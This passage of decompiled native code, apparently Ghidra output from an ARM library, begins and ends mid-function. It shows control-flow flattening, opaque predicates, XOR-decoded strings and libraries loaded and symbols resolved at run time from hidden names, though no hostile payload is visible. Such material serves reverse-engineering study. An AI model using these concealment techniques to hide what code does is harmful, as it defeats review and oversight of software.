                                             *(byte *)(iVar20 + 0x28f33) & 0x2c) ^ 0xf6;
                                        *(byte *)(iVar28 + 0x28f50) =
                                             *(byte *)(iVar20 + 0x28f34) ^ 0xd3;
                                        iVar20 = DAT_0002a004;
                                        iVar19 = DAT_0002a000;
                                        iVar29 = DAT_000291cc;
                                        *(byte *)(DAT_0002a004 + 0x29044) =
                                             *(byte *)(DAT_0002a000 + 0x29034) ^ 0x49;
                                        *(byte *)(iVar20 + 0x29045) =
                                             *(byte *)(iVar19 + 0x29035) ^ 0xa0;
                                        *(byte *)(iVar20 + 0x29046) =
                                             ~((*(byte *)(iVar19 + 0x29036) | 0x91) &
                                              (~*(byte *)(iVar19 + 0x29036) | 0x6e));
                                        *(byte *)(iVar20 + 0x29047) =
                                             *(byte *)(iVar19 + 0x29037) ^ 0x55;
                                        *(byte *)(iVar20 + 0x29048) =
                                             *(byte *)(iVar19 + 0x29038) ^ 0x68;
                                        *(byte *)(iVar20 + 0x29049) =
                                             (~*(byte *)(iVar19 + 0x29039) | 0xf1) &
                                             (*(byte *)(iVar19 + 0x29039) | 0xe);
                                        *(byte *)(iVar20 + 0x2904a) =
                                             *(byte *)(iVar19 + 0x2903a) ^ 0x5e;
                                        *(byte *)(iVar20 + 0x2904b) =
                                             *(byte *)(iVar19 + 0x2903b) ^ 0x69;
                                        *(byte *)(iVar20 + 0x2904c) =
                                             *(byte *)(iVar19 + 0x2903c) ^ 0xfe;
                                        *local_40 = *(byte *)(iVar19 + 0x2903d);
                                        **ppiVar32 = iVar29;
                                        piVar25 = piVar21;
                                        iVar19 = iVar17;
                                      }
                                      else if (iVar15 == DAT_00029594) {
                                        **ppiVar32 = DAT_0002ce30;
                                      }
                                      else if (iVar15 == DAT_00029598) {
                                        **ppiVar32 = DAT_0002c410;
                                      }
                                      else if (iVar15 == DAT_0002959c) {
                                        FUN_0002cfb8(DAT_0002acfc + 0x29f7c,DAT_0002ad00 + 0x29f80);
                                        **ppiVar32 = DAT_000296ac;
                                      }
                                      else if (iVar15 == DAT_000295a0) {
                                        uVar18 = dlsym(*local_38,DAT_0002c360 + 0x2b654);
                                        iVar23 = DAT_0002c364;
                                        *(undefined4 *)(DAT_0002c364 + 0x2b670) = uVar18;
                                        uVar18 = dlsym(*(undefined4 *)(iVar23 + 0x2b66c),
                                                       DAT_0002c368 + 0x2b670);
                                        *(undefined4 *)(iVar23 + 0x2b674) = uVar18;
                                        uVar18 = dlsym(*(undefined4 *)(iVar23 + 0x2b66c),
                                                       DAT_0002c36c + 0x2b684);
                                        *(undefined4 *)(iVar23 + 0x2b678) = uVar18;
                                        uVar18 = dlsym(*(undefined4 *)(iVar23 + 0x2b66c),
                                                       DAT_0002c370 + 0x2b698);
                                        *(undefined4 *)(iVar23 + 0x2b67c) = uVar18;
                                        uVar18 = dlsym(*(undefined4 *)(iVar23 + 0x2b66c),
                                                       DAT_0002c374 + 0x2b6ac);
                                        *(undefined4 *)(iVar23 + 0x2b680) = uVar18;
                                        uVar18 = dlsym(*(undefined4 *)(iVar23 + 0x2b66c),
                                                       DAT_0002c378 + 0x2b6c0);
                                        *(undefined4 *)(iVar23 + 0x2b684) = uVar18;
                                        uVar18 = dlsym(*(undefined4 *)(iVar23 + 0x2b66c),
                                                       DAT_0002c37c + 0x2b6d4);
                                        *(undefined4 *)(iVar23 + 0x2b688) = uVar18;
                                        uVar18 = dlsym(*(undefined4 *)(iVar23 + 0x2b66c),
                                                       DAT_0002c380 + 0x2b6e8);
                                        *(undefined4 *)(iVar23 + 0x2b68c) = uVar18;
                                        iVar23 = DAT_0002b488;
                                        **ppiVar32 = DAT_0002c384;
                                      }
                                      else if (iVar15 == DAT_000295a4) {
                                        **ppiVar32 = DAT_000294ec;
                                      }
                                      else if (iVar15 == DAT_000295a8) {
                                        **ppiVar32 = iVar23;
                                      }
                                      else {
                                        if (iVar15 == DAT_000295ac) {
                                          *local_54 = *local_38 == 0;
                                          uVar16 = (*(uint *)(DAT_0002a26c + 0x29718) ^ DAT_0002a25c
                                                   ) & (*(uint *)(DAT_0002a264 + 0x2970c) ^
                                                       DAT_0002a268);
                                          uVar16 = (~uVar16 + (DAT_0002a260 + 1 ^ DAT_0002a260) +
                                                    (uVar16 | DAT_0002a270) + DAT_0002a274 &
                                                   DAT_0002a278) * DAT_0002a27c;
                                          iVar17 = DAT_000293bc;
                                          if (DAT_0002a280 <= uVar16 && uVar16 - DAT_0002a280 != 0)
                                          {
                                            iVar17 = 0x3f9d5031;
                                          }
                                          goto LAB_0002cd74;
                                        }
                                        if (iVar15 == DAT_000295b0) {
                                          uVar24 = 0;
                                          goto LAB_0002cd10;
                                        }
                                        if (iVar15 == DAT_000295b4) {
                                          iVar17 = DAT_000297d8;
                                          if (((*(uint *)(DAT_0002a194 + 0x292b8) ^ DAT_0002a190) &
                                              (*(uint *)(DAT_0002a188 + 0x292ac) ^ DAT_0002a18c)) *
                                              DAT_0002a198 - DAT_0002a19c == 0) {
                                            iVar17 = 0x35f60fdf;
                                          }
                                          goto LAB_0002cd74;
                                        }
                                        if (iVar15 == DAT_00029670) {
                                          uVar16 = *(uint *)(DAT_0002b9b4 + 0x2aacc) ^ DAT_0002b9b8;
                                          uVar22 = *(uint *)(DAT_0002b9c4 + 0x2aaec) ^ DAT_0002b9bc;
                                          uVar16 = uVar22 + uVar16 +
                                                   (DAT_0002b9c0 + 1 ^ DAT_0002b9c0) +
                                                   ~(uVar16 & uVar22) + DAT_0002b9cc;
                                          iVar17 = DAT_0002b9d8;
                                          iVar23 = DAT_0002b488;
                                          if (DAT_0002b9d4 <
                                              (uVar16 - (DAT_0002b9d0 ^ DAT_0002b9d0 + 2) *
                                                        (uVar16 & DAT_0002b9c8)) + DAT_0002b9c8) {
                                            iVar17 = -0x30f00e12;
                                            iVar23 = DAT_0002b488;
                                          }
                                          goto LAB_0002cd74;
                                        }
                                        if (iVar15 == DAT_00029674) {
                                          *(int *)(DAT_0002a1e8 + 0x29478) = *local_30;
                                          iVar20 = FUN_00035060((*(uint *)(DAT_0002a1f4 + 0x29494) ^
                                                                 uVar27 | *(uint *)(DAT_0002a1ec +
                                                                                   0x29488) ^
                                                                          DAT_0002a1f0) +
                                                                DAT_0002a1f8,DAT_0002a1fc);
                                          iVar17 = DAT_000294dc;
                                          if (iVar20 == DAT_0002a200) {
                                            iVar17 = 0x44003878;
                                          }
                                          goto LAB_0002cd74;
                                        }
                                        if (iVar15 == DAT_00029678) {
                                          uVar16 = (*(uint *)(DAT_0002a16c + 0x291f8) ^ DAT_0002a168
                                                   ) * (*(uint *)(DAT_0002a160 + 0x291ec) ^
                                                       DAT_0002a164);
                                          uVar16 = ((DAT_0002a170 & ~uVar16 | uVar16 & DAT_0002a174)
                                                   ^ DAT_0002a178) + DAT_0002a180;
                                          iVar17 = DAT_000295ac;
                                          if ((uVar16 & DAT_0002a17c) + (uVar16 | DAT_0002a17c) ==
                                              DAT_0002a184) {
                                            iVar17 = 0x5f35c68e;
                                          }
                                          goto LAB_0002cd74;
                                        }
                                        if (iVar15 == DAT_0002967c) {
                                          DataMemoryBarrier(0xb);
                                          *(undefined4 *)(DAT_0002a910 + 0x29990) = 1;
                                          **ppiVar32 = DAT_000297dc;
                                        }
                                        else if (iVar15 == DAT_0002969c) {
                                          **ppiVar32 = DAT_000296a8;
                                        }
                                        else if (iVar15 == DAT_000296a0) {
                                          uVar22 = *(uint *)(DAT_0002c398 + 0x2b754);
                                          uVar27 = *(uint *)(DAT_0002c39c + 0x2b75c);
                                          uVar18 = dlsym(*local_38,DAT_0002c3a0 + 0x2b764);
                                          iVar26 = DAT_0002c3a4;
                                          *(undefined4 *)(DAT_0002c3a4 + 0x2b780) = uVar18;
                                          uVar18 = dlsym(*(undefined4 *)(iVar26 + 0x2b77c),
                                                         DAT_0002c3a8 + 0x2b780);
                                          *(undefined4 *)(iVar26 + 0x2b784) = uVar18;
                                          uVar18 = dlsym(*(undefined4 *)(iVar26 + 0x2b77c),
                                                         DAT_0002c3ac + 0x2b794);
                                          *(undefined4 *)(iVar26 + 0x2b788) = uVar18;
                                          uVar18 = dlsym(*(undefined4 *)(iVar26 + 0x2b77c),
                                                         DAT_0002c3b0 + 0x2b7a8);
                                          *(undefined4 *)(iVar26 + 0x2b78c) = uVar18;
                                          uVar18 = dlsym(*(undefined4 *)(iVar26 + 0x2b77c),
                                                         DAT_0002c3b4 + 0x2b7bc);
                                          *(undefined4 *)(iVar26 + 0x2b790) = uVar18;
                                          uVar18 = dlsym(*(undefined4 *)(iVar26 + 0x2b77c),
                                                         DAT_0002c3b8 + 0x2b7d0);
                                          *(undefined4 *)(iVar26 + 0x2b794) = uVar18;
                                          uVar18 = dlsym(*(undefined4 *)(iVar26 + 0x2b77c),
                                                         DAT_0002c3bc + 0x2b7e4);
                                          *(undefined4 *)(iVar26 + 0x2b798) = uVar18;
                                          iVar19 = dlsym(*(undefined4 *)(iVar26 + 0x2b77c),
                                                         DAT_0002c3c0 + 0x2b7f8);
                                          uVar16 = DAT_0002c3c4;
                                          *(int *)(iVar26 + 0x2b79c) = iVar19;
                                          *local_80 = iVar19;
                                          uVar18 = FUN_00035060(((uVar27 ^ DAT_0002c3c8) -
                                                                (uVar16 + 1 ^ uVar16)) +
                                                                (uVar22 ^ DAT_0002c3cc) + 1,
                                                                DAT_0002c3d0);
                                          iVar19 = FUN_00035060(uVar18,DAT_0002c3d4);
                                          piVar25 = local_2c;
                                          uVar16 = DAT_0002c384;
                                          if (iVar19 != DAT_0002c3d8) {
                                            uVar16 = 0x851b;
                                          }
                                          iVar23 = *(int *)(iVar26 + 0x2b780);
                                          iVar17 = *(int *)(iVar26 + 0x2b784);
                                          iVar20 = *(int *)(iVar26 + 0x2b788);
                                          iVar28 = *(int *)(iVar26 + 0x2b78c);
                                          if (iVar19 != DAT_0002c3d8) {
                                            uVar16 = uVar16 & 0xffff | 0xf4920000;
                                          }
                                          iVar26 = *(int *)(iVar26 + 0x2b794);
                                          **ppiVar32 = uVar16;
                                          *local_88 = iVar26;
                                          *local_84 = ((iVar23 == 0 || iVar17 == 0) || iVar20 == 0)
                                                      || iVar28 == 0;
                                          iVar23 = DAT_0002b488;
                                          iVar26 = DAT_0002ad8c;
                                          iVar19 = DAT_0002b98c;
                                        }
                                        else if (iVar15 == DAT_000296a4) {
                                          **ppiVar32 = DAT_00029574;
                                        }
                                        else {
                                          if (iVar15 == DAT_000296a8) {
                                            uVar16 = (*(uint *)(DAT_0002a1d0 + 0x293e8) ^
                                                     DAT_0002a1c8) -
                                                     (*(uint *)(DAT_0002a1c0 + 0x293d8) ^
                                                     DAT_0002a1c4);
                                            iVar20 = FUN_00035060((uVar16 | DAT_0002a1cc) *
                                                                  (uVar16 & DAT_0002a1cc) +
                                                                  (DAT_0002a1cc & ~uVar16) *
                                                                  (uVar16 & DAT_0002a1d4) |
                                                                  DAT_0002a1d8,DAT_0002a1dc);
                                            iVar17 = DAT_0002969c;
                                            if (iVar20 != DAT_0002a1e0) {
                                              iVar17 = -0x2f78ace2;
                                            }
                                            goto LAB_0002cd74;
                                          }
                                          if (iVar15 == DAT_000296ac) {
                                            uVar16 = *(uint *)(DAT_0002b978 + 0x2a9ec);
                                            uVar22 = *(uint *)(DAT_0002b97c + 0x2a9f4);
                                            iVar19 = FUN_0002cfb8(DAT_0002b980 + 0x2aa00,
                                                                  DAT_0002b984 + 0x2aa04);
                                            *local_30 = iVar19;
                                            uVar16 = (uVar16 ^ DAT_0002b994) -
                                                     (uVar22 ^ DAT_0002b990);
                                            uVar16 = ~(uVar16 & DAT_0002b988 |
                                                      DAT_0002b998 & ~uVar16) + DAT_0002b99c;
                                            iVar17 = DAT_0002b9ac;
                                            piVar25 = local_2c;
                                            iVar23 = DAT_0002b488;
                                            iVar19 = DAT_0002b98c;
                                            if (DAT_0002b9a8 <
                                                (uVar16 & DAT_0002b9a0) - (DAT_0002b9a4 & ~uVar16))
                                            {
                                              iVar17 = 0x55244025;
                                              iVar23 = DAT_0002b488;
                                            }
                                            goto LAB_0002cd74;
                                          }
                                          if (iVar15 == DAT_000296b0) {
                                            uVar16 = DAT_0002c358;
                                            if (*local_64 != '\0') {
                                              uVar16 = DAT_0002c350 + 0x6900U ^ DAT_0002c354;
                                            }
                                            **ppiVar32 = uVar16;
                                          }
                                          else if (iVar15 == DAT_000296b4) {
                                            **ppiVar32 = DAT_000292dc;
                                          }
                                          else {
                                            if (iVar15 == DAT_000296b8) {
                                              uVar16 = FUN_00035060((*(uint *)(DAT_0002aca4 +
                                                                              0x29e54) ^
                                                                    DAT_0002aca0) -
                                                                    (*(uint *)(DAT_0002ac98 +
                                                                              0x29e48) ^
                                                                    DAT_0002ac9c),DAT_0002aca8);
                                              iVar17 = DAT_00029780;
                                              if (DAT_0002acb4 <
                                                  ((uVar16 | DAT_0002acac) ^ DAT_0002acb0)) {
                                                iVar17 = -0x38690b25;
                                              }
                                              goto LAB_0002cd74;
                                            }
                                            if (iVar15 == iVar29) {
                                              uVar18 = FUN_00035060((*(uint *)(DAT_0002acc4 +
                                                                              0x29eb8) ^
                                                                     DAT_0002acc0 |
                                                                    *(uint *)(DAT_0002acb8 + 0x29eac
                                                                             ) ^ DAT_0002acbc) +
                                                                    DAT_0002acc8,DAT_0002accc);
                                              iVar20 = FUN_00035060(uVar18,DAT_0002acd0);
                                              iVar17 = DAT_000292f8;
                                              if (iVar20 == DAT_0002acd4) {
                                                iVar17 = -0x317d36f0;
                                              }
                                              goto LAB_0002cd74;
                                            }
                                            if (iVar15 == DAT_000296bc) {
                                              **ppiVar32 = DAT_0002b9b0;
                                            }
                                            else {
                                              if (iVar15 == DAT_000296c0) {
                                                uVar16 = FUN_00035060((*(uint *)(DAT_0002c330 +
                                                                                0x2b590) ^
                                                                      DAT_0002c32c) +
                                                                      (*(uint *)(DAT_0002c324 +
                                                                                0x2b584) ^
                                                                      DAT_0002c328) +
                                                                      (DAT_0002c334 ^
                                                                      DAT_0002c334 + 1),DAT_0002c338
                                                                     );
                                                uVar16 = uVar16 & 5 | DAT_0002c33c & ~uVar16;
                                                iVar17 = DAT_0002c34c;
                                                if ((DAT_0002c344 & ~uVar16) +
                                                    (~uVar16 | DAT_0002c340) < DAT_0002c348) {
                                                  iVar17 = -0x440de6cb;
                                                }
                                                goto LAB_0002cd74;
                                              }
                                              if (iVar15 == DAT_000296c4) {
                                                iVar20 = FUN_00035060(*(uint *)(DAT_0002b9e0 +
                                                                               0x2ab90) ^
                                                                      DAT_0002b9e4,
                                                                      *(uint *)(DAT_0002b9ec +
                                                                               0x2ab9c) ^
                                                                      DAT_0002b9e8);
                                                iVar17 = DAT_0002ba00;
                                                if (DAT_0002b9fc <
                                                    (iVar20 * DAT_0002b9f0 + DAT_0002b9f4 |
                                                    DAT_0002b9f8)) {
                                                  iVar17 = 0x5586e6d9;
                                                }
                                                goto LAB_0002cd74;
                                              }
                                              if (iVar15 == DAT_000296c8) {
                                                uVar16 = ((*(uint *)(DAT_0002a238 + 0x295f8) ^
                                                          DAT_0002a240) & DAT_0002a234 |
                                                         (*(uint *)(DAT_0002a238 + 0x295f8) ^
                                                         DAT_0002a23c) & DAT_0002a230) ^
                                                         ((*(uint *)(DAT_0002a228 + 0x295d4) ^
                                                          DAT_0002a22c) & DAT_0002a234 |
                                                         (*(uint *)(DAT_0002a228 + 0x295d4) ^
                                                         0x44000032) & DAT_0002a230);
                                                uVar16 = ((uVar16 | DAT_0002a244) *
                                                          (uVar16 & DAT_0002a244) +
                                                         (DAT_0002a244 & ~uVar16) *
                                                         (uVar16 & DAT_0002a248)) * DAT_0002a250;
                                                iVar17 = DAT_00029788;
                                                if (DAT_0002a258 <
                                                    (uVar16 | DAT_0002a24c) *
                                                    (uVar16 & DAT_0002a24c) +
                                                    (uVar16 & DAT_0002a254) *
                                                    (DAT_0002a24c & ~uVar16)) {
                                                  iVar17 = -0x15164471;
                                                }
                                                goto LAB_0002cd74;
                                              }
                                              if (iVar15 == DAT_000296cc) {
                                                *local_64 = *local_80 == 0;
                                                uVar22 = *(uint *)(DAT_0002ab64 + 0x29b80) ^
                                                         DAT_0002ab38;
                                                uVar16 = *(uint *)(DAT_0002ab5c + 0x29b74) ^
                                                         DAT_0002ab68;
                                                uVar16 = ((uVar16 | uVar22) * (uVar16 & uVar22) +
                                                          (uVar16 & (*(uint *)(DAT_0002ab64 +
                                                                              0x29b80) ^
                                                                    DAT_0002ab58)) *
                                                          (uVar22 & (*(uint *)(DAT_0002ab5c +
                                                                              0x29b74) ^
                                                                    DAT_0002ab60)) ^ DAT_0002ab6c) +
                                                         DAT_0002ab70;
                                                iVar17 = DAT_000296cc;
                                                if (((uVar16 ^ DAT_0002ab74) & uVar16) <
                                                    DAT_0002ab78) {
                                                  iVar17 = -0x3d2e2342;
                                                }
                                                goto LAB_0002cd74;
                                              }
                                              if (iVar15 == DAT_000296d0) {
                                                **ppiVar32 = DAT_0002b8b8;
                                              }
                                              else {
                                                if (iVar15 == DAT_000296d4) {
                                                  uVar16 = (*(uint *)(DAT_0002a210 + 0x29514) ^
                                                           DAT_0002a20c) &
                                                           (*(uint *)(DAT_0002a204 + 0x29508) ^
                                                           DAT_0002a208);
                                                  uVar16 = FUN_00035060((~uVar16 | DAT_0002a218) +
                                                                        uVar16 + (DAT_0002a214 ^
                                                                                 DAT_0002a214 + 1),
                                                                        DAT_0002a21c);
                                                  iVar17 = DAT_000295b0;
                                                  if ((uVar16 | DAT_0002a220) < DAT_0002a224) {
                                                    iVar17 = 0x6aa80487;
                                                  }
                                                  goto LAB_0002cd74;
                                                }
                                                if (iVar15 == DAT_000296d8) {
                                                  iVar17 = FUN_00035060(*(uint *)(DAT_0002ad04 +
                                                                                 0x29fa4) ^
                                                                        DAT_0002ad08,
                                                                        *(uint *)(DAT_0002ad10 +
                                                                                 0x29fb0) ^
                                                                        DAT_0002ad0c);
                                                  uVar16 = (iVar17 + DAT_0002ad14 ^ DAT_0002ad1c) &
                                                           iVar17 + DAT_0002ad14;
                                                  iVar17 = iVar19;
                                                  if ((uVar16 | DAT_0002ad18) *
                                                      (uVar16 & DAT_0002ad18) +
                                                      (DAT_0002ad18 & ~uVar16) *
                                                      (uVar16 & DAT_0002ad20) != DAT_0002ad24) {
                                                    iVar17 = 0x6aa80487;
                                                  }
                                                  goto LAB_0002cd74;
                                                }
                                                if (iVar15 == DAT_00029768) {
                                                  **ppiVar32 = DAT_0002b974;
                                                  *local_7c = *local_68 == 0;
                                                }
                                                else {
                                                  if (iVar15 == DAT_0002976c) {
                                                    *local_74 = (int)*local_44 <
                                                                (int)(DAT_0002ad28 + 1 ^
                                                                     DAT_0002ad28);
                                                    uVar16 = (*(uint *)(DAT_0002ad38 + 0x2a050) ^
                                                             DAT_0002ad2c) +
                                                             (*(uint *)(DAT_0002ad30 + 0x2a044) ^
                                                             DAT_0002ad34) & DAT_0002ad40;
                                                    iVar17 = DAT_0002978c;
                                                    if ((~uVar16 | DAT_0002ad44) +
                                                        uVar16 + (DAT_0002ad3c + 1 ^ DAT_0002ad3c) +
                                                        DAT_0002ad48 < DAT_0002ad4c) {
                                                      iVar17 = -0x3232946b;
                                                    }
                                                    goto LAB_0002cd74;
                                                  }
                                                  if (iVar15 == DAT_00029780) {
                                                    *(int *)((int)&DAT_0002a154 + DAT_0002ad74) =
                                                         DAT_0002ad78 + 0x2a130;
                                                    **ppiVar32 = DAT_000293ac;
                                                  }
                                                  else {
                                                    if (iVar15 == DAT_00029784) {
                                                      iVar17 = DAT_000292f0;
                                                      if (*local_4c != '\0') {
                                                        iVar17 = -0x5a92a3f1;
                                                      }
                                                      goto LAB_0002cd74;
                                                    }
                                                    if (iVar15 == DAT_00029788) {
                                                      **ppiVar32 = DAT_000294c0;
                                                    }
                                                    else if (iVar15 == DAT_0002978c) {
                                                      **ppiVar32 = DAT_0002976c;
                                                    }
                                                    else if (iVar15 == DAT_00029790) {
                                                      **ppiVar32 = DAT_000294f0;
                                                      *local_78 = -(*local_74 & 1);
                                                    }
                                                    else {
                                                      if (iVar15 == DAT_000297bc) {
                                                        *local_6c = *local_98 == 0;
                                                        uVar22 = *(uint *)(DAT_0002ac48 + 0x29c98) ^
                                                                 DAT_0002ac38;
                                                        uVar16 = *(uint *)(DAT_0002ac40 + 0x29c8c) ^
                                                                 DAT_0002ac4c;
                                                        uVar16 = (uVar16 | uVar22) *
                                                                 (uVar16 & uVar22) +
                                                                 (uVar16 & (*(uint *)(DAT_0002ac48 +
                                                                                     0x29c98) ^
                                                                           DAT_0002ac3c)) *
                                                                 (uVar22 & (*(uint *)(DAT_0002ac40 +
                                                                                     0x29c8c) ^
                                                                           DAT_0002ac44));
                                                        iVar17 = DAT_000297c0;
                                                        if (DAT_0002ac5c <
                                                            (~uVar16 | DAT_0002ac54) +
                                                            uVar16 + (DAT_0002ac50 + 1 ^
                                                                     DAT_0002ac50) + DAT_0002ac58) {
                                                          iVar17 = -0x32b16944;
                                                        }
                                                        goto LAB_0002cd74;
                                                      }
                                                      if (iVar15 == DAT_000297c0) {
                                                        **ppiVar32 = DAT_000293a4;
                                                      }
                                                      else {
                                                        if (iVar15 == DAT_000297d4) {
                                                          *local_50 = *(int *)(DAT_0002a8d8 +
                                                                              0x298f0);
                                                          uVar16 = *(uint *)(DAT_0002a8f4 + 0x29910)
                                                                   ^ DAT_0002a8f8;
                                                          uVar22 = *(uint *)(DAT_0002a8fc + 0x2991c)
                                                                   ^ DAT_0002a8dc;
                                                          uVar16 = uVar22 + uVar16 +
                                                                   (DAT_0002a8e0 ^ DAT_0002a8e0 + 1)
                                                                   + ~(uVar16 & uVar22);
                                                          iVar17 = DAT_000297d4;
                                                          iVar23 = DAT_000291c8;
                                                          if (DAT_0002a90c <
                                                              ((uVar16 & DAT_0002a904) -
                                                              (DAT_0002a900 & ~uVar16)) +
                                                              DAT_0002a908) {
                                                            iVar17 = 0x3c2c5008;
                                                          }
                                                          goto LAB_0002cd74;
                                                        }
                                                        if (iVar15 == DAT_000297d8) {
                                                          iVar17 = DAT_00029598;
                                                          if ((*(uint *)(DAT_0002ac64 + 0x29d24) ^
                                                               *(uint *)(DAT_0002ac60 + 0x29d1c) ^
                                                               DAT_0002ac68 | DAT_0002ac6c) ==
                                                              DAT_0002ac70) {
                                                            iVar17 = 0x35f60fdf;
                                                          }
                                                          **ppiVar32 = iVar17;
                                                          *local_8c = *local_84 & 1 | *local_88 == 0
                                                          ;
                                                        }
                                                        else {
                                                          if (iVar15 == DAT_000297dc) {
                                                            uVar22 = *(uint *)(DAT_0002aa88 +
                                                                              0x29a94);
                                                            uVar16 = *(uint *)(DAT_0002aa8c +
                                                                              0x29a9c);
                                                            DataMemoryBarrier(0xb);
                                                            *(undefined4 *)(DAT_0002aa90 + 0x29aa8)
                                                                 = 1;
                                                            *local_44 = *(uint *)(DAT_0002aa94 +
                                                                                 0x29ab8) ^
                                                                        DAT_0002aa98;
                                                            iVar17 = FUN_00035060(uVar16 ^ 
                                                  DAT_0002aa9c,uVar22 ^ DAT_0002aaa0);
                                                  uVar16 = iVar17 + DAT_0002aaa4;
                                                  iVar17 = DAT_000296d0;
                                                  if (DAT_0002aab4 <
                                                      ((uVar16 | DAT_0002aaa8) *
                                                       (uVar16 & DAT_0002aaa8) +
                                                       (uVar16 & DAT_0002aaac) *
                                                       (DAT_0002aaa8 & ~uVar16) & DAT_0002aab0)) {
                                                    iVar17 = 0x4984bce6;
                                                  }
                                                  goto LAB_0002cd74;
                                                  }
                                                  if (iVar15 == DAT_000297e0) {
                                                    uVar16 = (*(uint *)(DAT_0002a9d0 + 0x299fc) ^
                                                             DAT_0002a9cc) -
                                                             (*(uint *)(DAT_0002a9c4 + 0x299f0) ^
                                                             DAT_0002a9c8);
                                                    bVar34 = ((~uVar16 | DAT_0002a9d4) &
                                                             (uVar16 | DAT_0002a9d8)) ==
                                                             DAT_0002a9dc;
                                                    iVar17 = DAT_000296b0;
                                                    goto LAB_00029a24;
                                                  }
                                                  if (iVar15 == DAT_000297e4) {
                                                    return *local_94;
                                                  }
                                                  }
                                                  }
                                                  }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  } while( true );
}



// ---- 0002cfb8  FUN_0002cfb8  size=1452

int FUN_0002cfb8(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  uint uVar9;
  int local_80;
  int local_78 [2];
  int local_70 [2];
  int local_68 [2];
  char local_60 [8];
  int local_58 [2];
  uint local_50 [2];
  uint *local_48;
  int *local_44;
  int *local_40;
  char *local_3c;
  undefined4 local_38;
  undefined4 local_34;
  int *local_30;
  int *local_2c;
  
  local_48 = local_50;
  local_2c = local_58;
  local_3c = local_60;
  local_40 = local_68;
  local_30 = local_70;
  local_44 = local_78;
  local_38 = param_1;
  local_34 = param_2;
  uVar4 = FUN_00035060(*(uint *)(DAT_0002d668 + 0x2d028) ^ DAT_0002d564,
                       *(uint *)(DAT_0002d66c + 0x2d038) ^ DAT_0002d568);
  iVar3 = DAT_0002d594;
  iVar2 = DAT_0002d58c;
  iVar1 = DAT_0002d588;
  uVar4 = (uVar4 + (uVar4 ^ DAT_0002d56c)) - (uVar4 & DAT_0002d570);
  local_50[0] = (uVar4 | DAT_0002d578) * (uVar4 & DAT_0002d578) +
                (DAT_0002d578 & ~uVar4) * (uVar4 & DAT_0002d574) + DAT_0002d57c;
  local_80 = DAT_0002d580;
  iVar6 = DAT_0002d580;
  iVar8 = DAT_0002d5a0;
  iVar5 = local_80;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        while( true ) {
                          while( true ) {
                            while( true ) {
                              while( true ) {
                                while( true ) {
                                  while (local_80 = iVar5, iVar5 = iVar8, local_80 == iVar1) {
                                    *local_44 = *local_30;
                                    uVar4 = *(uint *)(DAT_0002d69c + 0x2d2d0) ^
                                            *(uint *)(DAT_0002d698 + 0x2d2c8);
                                    uVar4 = FUN_00035060(((uVar4 ^ 0x40041) & 0x5700c3 | 0x500082) -
                                                         ((uVar4 ^ DAT_0002d5e4) & DAT_0002d5e8),
                                                         DAT_0002d5ec);
                                    if (DAT_0002d5f0 < uVar4) {
                                      iVar5 = 0x6ed1fa7b;
                                    }
                                  }
                                  if (local_80 != iVar2) break;
                                  local_80 = DAT_0002d5a8;
                                  iVar5 = local_80;
                                }
                                if (local_80 != DAT_0002d590) break;
                                uVar4 = FUN_00035060(*(uint *)(DAT_0002d688 + 0x2d4e4) ^
                                                     DAT_0002d60c,
                                                     *(uint *)(DAT_0002d68c + 0x2d4f0) ^
                                                     DAT_0002d610);
                                iVar5 = DAT_0002d5a4;
                                if (DAT_0002d620 <
                                    (uVar4 ^ DAT_0002d614) * DAT_0002d61c + DAT_0002d618) {
                                  iVar5 = 0x668287a5;
                                }
                              }
                              if (local_80 != iVar3) break;
                              local_80 = iVar1;
                              *local_30 = *local_40;
                              iVar5 = local_80;
                            }
                            if (local_80 != DAT_0002d598) break;
                            local_80 = DAT_0002d5b4;
                            iVar5 = local_80;
                          }
                          if (local_80 != DAT_0002d59c) break;
                          uVar9 = *(uint *)(DAT_0002d670 + 0x2d3b0);
                          uVar4 = *(uint *)(DAT_0002d674 + 0x2d3b8);
                          iVar6 = dlopen(local_38,0);
                          *local_2c = iVar6;
                          uVar4 = uVar4 ^ DAT_0002d648;
                          uVar9 = uVar9 ^ DAT_0002d64c;
                          uVar4 = (uVar9 & uVar4) + (uVar9 | uVar4) + DAT_0002d650;
                          iVar6 = DAT_0002d580;
                          iVar8 = DAT_0002d5a0;
                          iVar5 = DAT_0002d598;
                          if ((uVar4 | DAT_0002d654) * (uVar4 & DAT_0002d654) +
                              (uVar4 & DAT_0002d658) * (DAT_0002d654 & ~uVar4) + DAT_0002d65c <
                              DAT_0002d660) {
                            iVar5 = 0x1568bf4b;
                          }
                        }
                        if (local_80 != iVar8) break;
                        uVar4 = FUN_00035060((*(uint *)(DAT_0002d6a4 + 0x2d49c) ^ DAT_0002d5d0) *
                                             (*(uint *)(DAT_0002d6a0 + 0x2d490) ^ DAT_0002d5cc),
                                             DAT_0002d5d4);
                        iVar7 = FUN_00035060(uVar4 ^ DAT_0002d5d8,DAT_0002d5dc);
                        if (iVar7 != DAT_0002d5e0) {
                          iVar5 = 0x3ac4e2d0;
                        }
                      }
                      if (local_80 != DAT_0002d5a4) break;
                      dlopen(local_34,0);
                      local_80 = DAT_0002d5c0;
                      iVar5 = local_80;
                    }
                    if (local_80 != DAT_0002d5a8) break;
                    iVar5 = iVar2;
                    if (((*(uint *)(DAT_0002d684 + 0x2d1cc) ^ DAT_0002d628) -
                        (*(uint *)(DAT_0002d680 + 0x2d1c0) ^ DAT_0002d624)) * DAT_0002d62c -
                        DAT_0002d630 != 0) {
                      iVar5 = 0x2e5c0d5c;
                    }
                  }
                  if (local_80 != DAT_0002d5ac) break;
                  uVar4 = FUN_00035060((*(uint *)(DAT_0002d67c + 0x2d450) ^ DAT_0002d638) &
                                       (*(uint *)(DAT_0002d678 + 0x2d444) ^ DAT_0002d634),
                                       DAT_0002d63c);
                  iVar5 = DAT_0002d5a8;
                  if ((uVar4 | DAT_0002d640) == DAT_0002d644) {
                    iVar5 = -0x5445fa99;
                  }
                }
                if (local_80 != DAT_0002d5b0) break;
                dlopen(local_38,0);
                local_80 = DAT_0002d59c;
                iVar5 = local_80;
              }
